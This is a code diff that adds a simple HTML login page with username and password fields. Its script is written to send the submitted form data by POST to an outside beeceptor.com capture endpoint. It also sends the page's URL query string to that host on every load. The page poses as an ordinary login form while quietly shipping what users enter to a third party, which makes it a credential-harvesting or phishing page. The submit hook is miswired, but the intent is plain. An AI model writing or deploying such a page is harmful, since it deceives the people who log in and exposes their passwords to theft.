@@ -3,12 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Login page</title>
 </head>
 <body>
-    Nothing
+    <p>Text</p>
+    <form id="loginForm" method="POST" action="/success.html" onsubmit="logFormdata">
+        <input placeholder="username...">
+        <input placeholder="password..." type="password">
+        <br/>
+        <input type = "submit" value="Login">
+    </form>
 </body>
 <script>
+    function logFormdata(){
+        var form = document.getElementById("loginForm");
+        var data = new FormData(form);
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("POST","https://zyxwv.free.beeceptor.com",true);
+        xhttp.send(data);
+    }
     var xhttp = new XMLHttpRequest();
     xhttp.open("GET","https://zyxwv.free.beeceptor.com/"+location.search,true);
     xhttp.send();
